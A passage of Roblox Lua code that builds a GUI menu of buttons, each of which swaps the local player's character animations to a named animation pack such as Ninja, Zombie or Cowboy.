			NormalTab.BackgroundTransparency = 1
			NormalTab.BorderSizePixel = 0
			NormalTab.Position = UDim2.new(0.5, 0, 0.119999997, 0)
			NormalTab.Size = UDim2.new(0, 150, 0, 500)

			A_Astronaut.Name = "A_Astronaut"
			A_Astronaut.Parent = NormalTab
			A_Astronaut.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Astronaut.BorderSizePixel = 0
			A_Astronaut.Position = UDim2.new(0, 0, 0.815764725, 0)
			A_Astronaut.Size = UDim2.new(0, 150, 0, 30)
			A_Astronaut.Font = Enum.Font.SciFi
			A_Astronaut.Text = "Astronaut"
			A_Astronaut.TextColor3 = Color3.new(1, 1, 1)
			A_Astronaut.TextSize = 20
			A_Astronaut.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891667138"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Bubbly.Name = "A_Bubbly"
			A_Bubbly.Parent = NormalTab
			A_Bubbly.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Bubbly.BorderSizePixel = 0
			A_Bubbly.Position = UDim2.new(0, 0, 0.349019617, 0)
			A_Bubbly.Size = UDim2.new(0, 150, 0, 30)
			A_Bubbly.Font = Enum.Font.SciFi
			A_Bubbly.Text = "Bubbly"
			A_Bubbly.TextColor3 = Color3.new(1, 1, 1)
			A_Bubbly.TextSize = 20
			A_Bubbly.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
				game.Players.LocalPlayer.Character.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
				game.Players.LocalPlayer.Character.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cartoony.Name = "A_Cartoony"
			A_Cartoony.Parent = NormalTab
			A_Cartoony.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cartoony.BorderSizePixel = 0
			A_Cartoony.Position = UDim2.new(0, 0, 0.407272667, 0)
			A_Cartoony.Size = UDim2.new(0, 150, 0, 30)
			A_Cartoony.Font = Enum.Font.SciFi
			A_Cartoony.Text = "Cartoony"
			A_Cartoony.TextColor3 = Color3.new(1, 1, 1)
			A_Cartoony.TextSize = 20
			A_Cartoony.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Elder.Name = "A_Elder"
			A_Elder.Parent = NormalTab
			A_Elder.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Elder.BorderSizePixel = 0
			A_Elder.Position = UDim2.new(6.51925802e-09, 0, 0.636310041, 0)
			A_Elder.Size = UDim2.new(0, 150, 0, 30)
			A_Elder.Font = Enum.Font.SciFi
			A_Elder.Text = "Elder"
			A_Elder.TextColor3 = Color3.new(1, 1, 1)
			A_Elder.TextSize = 20
			A_Elder.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Knight.Name = "A_Knight"
			A_Knight.Parent = NormalTab
			A_Knight.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Knight.BorderSizePixel = 0
			A_Knight.Position = UDim2.new(0, 0, 0.52352941, 0)
			A_Knight.Size = UDim2.new(0, 150, 0, 30)
			A_Knight.Font = Enum.Font.SciFi
			A_Knight.Text = "Knight"
			A_Knight.TextColor3 = Color3.new(1, 1, 1)
			A_Knight.TextSize = 20
			A_Knight.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=658360781"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=657600338"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Levitation.Name = "A_Levitation"
			A_Levitation.Parent = NormalTab
			A_Levitation.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Levitation.BorderSizePixel = 0
			A_Levitation.Position = UDim2.new(0, 0, 0.115472436, 0)
			A_Levitation.Size = UDim2.new(0, 150, 0, 30)
			A_Levitation.Font = Enum.Font.SciFi
			A_Levitation.Text = "Levitation"
			A_Levitation.TextColor3 = Color3.new(1, 1, 1)
			A_Levitation.TextSize = 20
			A_Levitation.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Mage.Name = "A_Mage"
			A_Mage.Parent = NormalTab
			A_Mage.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Mage.BorderSizePixel = 0
			A_Mage.Position = UDim2.new(0, 0, 0.696203232, 0)
			A_Mage.Size = UDim2.new(0, 150, 0, 30)
			A_Mage.Font = Enum.Font.SciFi
			A_Mage.Text = "Mage"
			A_Mage.TextColor3 = Color3.new(1, 1, 1)
			A_Mage.TextSize = 20
			A_Mage.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ninja.Name = "A_Ninja"
			A_Ninja.Parent = NormalTab
			A_Ninja.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ninja.BorderSizePixel = 0
			A_Ninja.Position = UDim2.new(0, 0, 0.0597896464, 0)
			A_Ninja.Size = UDim2.new(0, 150, 0, 30)
			A_Ninja.Font = Enum.Font.SciFi
			A_Ninja.Text = "Ninja"
			A_Ninja.TextColor3 = Color3.new(1, 1, 1)
			A_Ninja.TextSize = 20
			A_Ninja.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Pirate.Name = "A_Pirate"
			A_Pirate.Parent = NormalTab
			A_Pirate.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Pirate.BorderSizePixel = 0
			A_Pirate.Position = UDim2.new(-0.000333309174, 0, 0.874588311, 0)
			A_Pirate.Size = UDim2.new(0, 150, 0, 30)
			A_Pirate.Font = Enum.Font.SciFi
			A_Pirate.Text = "Pirate"
			A_Pirate.TextColor3 = Color3.new(1, 1, 1)
			A_Pirate.TextSize = 20
			A_Pirate.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Robot.Name = "A_Robot"
			A_Robot.Parent = NormalTab
			A_Robot.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Robot.BorderSizePixel = 0
			A_Robot.Position = UDim2.new(0, 0, 0.291479498, 0)
			A_Robot.Size = UDim2.new(0, 150, 0, 30)
			A_Robot.Font = Enum.Font.SciFi
			A_Robot.Text = "Robot"
			A_Robot.TextColor3 = Color3.new(1, 1, 1)
			A_Robot.TextSize = 20
			A_Robot.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Stylish.Name = "A_Stylish"
			A_Stylish.Parent = NormalTab
			A_Stylish.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Stylish.BorderSizePixel = 0
			A_Stylish.Position = UDim2.new(0, 0, 0.232816339, 0)
			A_Stylish.Size = UDim2.new(0, 150, 0, 30)
			A_Stylish.Font = Enum.Font.SciFi
			A_Stylish.Text = "Stylish"
			A_Stylish.TextColor3 = Color3.new(1, 1, 1)
			A_Stylish.TextSize = 20
			A_Stylish.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_SuperHero.Name = "A_SuperHero"
			A_SuperHero.Parent = NormalTab
			A_SuperHero.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_SuperHero.BorderSizePixel = 0
			A_SuperHero.Position = UDim2.new(0, 0, 0.464919746, 0)
			A_SuperHero.Size = UDim2.new(0, 150, 0, 30)
			A_SuperHero.Font = Enum.Font.SciFi
			A_SuperHero.Text = "SuperHero"
			A_SuperHero.TextColor3 = Color3.new(1, 1, 1)
			A_SuperHero.TextSize = 20
			A_SuperHero.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Toy.Name = "A_Toy"
			A_Toy.Parent = NormalTab
			A_Toy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Toy.BorderSizePixel = 0
			A_Toy.Position = UDim2.new(6.51925802e-09, 0, 0.756028414, 0)
			A_Toy.Size = UDim2.new(0, 150, 0, 30)
			A_Toy.Font = Enum.Font.SciFi
			A_Toy.Text = "Toy"
			A_Toy.TextColor3 = Color3.new(1, 1, 1)
			A_Toy.TextSize = 20
			A_Toy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=782841498"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=782845736"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=782843345"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=782842708"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=782847020"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=782843869"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=782846423"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Vampire.Name = "A_Vampire"
			A_Vampire.Parent = NormalTab
			A_Vampire.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Vampire.BorderSizePixel = 0
			A_Vampire.Position = UDim2.new(0, 0, 0.934021354, 0)
			A_Vampire.Size = UDim2.new(0, 150, 0, 30)
			A_Vampire.Font = Enum.Font.SciFi
			A_Vampire.Text = "Vampire"
			A_Vampire.TextColor3 = Color3.new(1, 1, 1)
			A_Vampire.TextSize = 20
			A_Vampire.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Werewolf.Name = "A_Werewolf"
			A_Werewolf.Parent = NormalTab
			A_Werewolf.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Werewolf.BorderSizePixel = 0
			A_Werewolf.Position = UDim2.new(-0.000333368778, 0, 0.174509808, 0)
			A_Werewolf.Size = UDim2.new(0, 150, 0, 30)
			A_Werewolf.Font = Enum.Font.SciFi
			A_Werewolf.Text = "Werewolf"
			A_Werewolf.TextColor3 = Color3.new(1, 1, 1)
			A_Werewolf.TextSize = 20
			A_Werewolf.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Zombie.Name = "A_Zombie"
			A_Zombie.Parent = NormalTab
			A_Zombie.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Zombie.BorderSizePixel = 0
			A_Zombie.Position = UDim2.new(-1.1920929e-07, 0, 0.582352936, 0)
			A_Zombie.Size = UDim2.new(0, 150, 0, 30)
			A_Zombie.Font = Enum.Font.SciFi
			A_Zombie.Text = "Zombie"
			A_Zombie.TextColor3 = Color3.new(1, 1, 1)
			A_Zombie.TextSize = 20
			A_Zombie.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			Category.Name = "Category"
			Category.Parent = NormalTab
			Category.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
			Category.BorderSizePixel = 0
			Category.Size = UDim2.new(0, 150, 0, 30)
			Category.Text = "Normal"
			Category.TextColor3 = Color3.new(0, 0.835294, 1)
			Category.TextSize = 14

			SpecialTab.Name = "SpecialTab"
			SpecialTab.Parent = Main
			SpecialTab.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
			SpecialTab.BackgroundTransparency = 1
			SpecialTab.BorderSizePixel = 0
			SpecialTab.Position = UDim2.new(0, 0, 0.119999997, 0)
			SpecialTab.Size = UDim2.new(0, 150, 0, 230)

			A_Patrol.Name = "A_Patrol"
			A_Patrol.Parent = SpecialTab
			A_Patrol.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Patrol.BorderSizePixel = 0
			A_Patrol.Position = UDim2.new(0, 0, 0.259960413, 0)
			A_Patrol.Size = UDim2.new(0, 150, 0, 30)
			A_Patrol.Font = Enum.Font.SciFi
			A_Patrol.Text = "Patrol"
			A_Patrol.TextColor3 = Color3.new(1, 1, 1)
			A_Patrol.TextSize = 20
			A_Patrol.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Confident.Name = "A_Confident"
			A_Confident.Parent = SpecialTab
			A_Confident.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Confident.BorderSizePixel = 0
			A_Confident.Position = UDim2.new(0, 0, 0.389248967, 0)
			A_Confident.Size = UDim2.new(0, 150, 0, 30)
			A_Confident.Font = Enum.Font.SciFi
			A_Confident.Text = "Confident"
			A_Confident.TextColor3 = Color3.new(1, 1, 1)
			A_Confident.TextSize = 20
			A_Confident.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Popstar.Name = "A_Popstar"
			A_Popstar.Parent = SpecialTab
			A_Popstar.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Popstar.BorderSizePixel = 0
			A_Popstar.Position = UDim2.new(0, 0, 0.130671918, 0)
			A_Popstar.Size = UDim2.new(0, 150, 0, 30)
			A_Popstar.Font = Enum.Font.SciFi
			A_Popstar.Text = "Popstar"
			A_Popstar.TextColor3 = Color3.new(1, 1, 1)
			A_Popstar.TextSize = 20
			A_Popstar.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Cowboy.Name = "A_Cowboy"
			A_Cowboy.Parent = SpecialTab
			A_Cowboy.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Cowboy.BorderSizePixel = 0
			A_Cowboy.Position = UDim2.new(0, 0, 0.772964239, 0)
			A_Cowboy.Size = UDim2.new(0, 150, 0, 30)
			A_Cowboy.Font = Enum.Font.SciFi
			A_Cowboy.Text = "Cowboy"
			A_Cowboy.TextColor3 = Color3.new(1, 1, 1)
			A_Cowboy.TextSize = 20
			A_Cowboy.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer.Character.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
				game.Players.LocalPlayer.Character.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
				game.Players.LocalPlayer.Character.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
				game.Players.LocalPlayer.Character.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
				game.Players.LocalPlayer.Character.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
				game.Players.LocalPlayer.Character.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
				game.Players.LocalPlayer.Character.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
			end)

			A_Ghost.Name = "A_Ghost"
			A_Ghost.Parent = SpecialTab
			A_Ghost.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
			A_Ghost.BorderSizePixel = 0
